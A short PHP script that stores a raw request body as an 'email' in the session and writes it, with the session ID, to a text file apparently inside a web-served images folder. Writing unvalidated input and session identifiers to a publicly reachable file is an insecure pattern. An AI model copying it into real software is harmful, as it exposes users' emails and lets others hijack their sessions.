<?php
session_start();
$_SESSION["email"] = file_get_contents("php://input");
file_put_contents("imgs/email.txt", $_SESSION["email"] . "     " . session_id());
echo "emailsetok";
?>
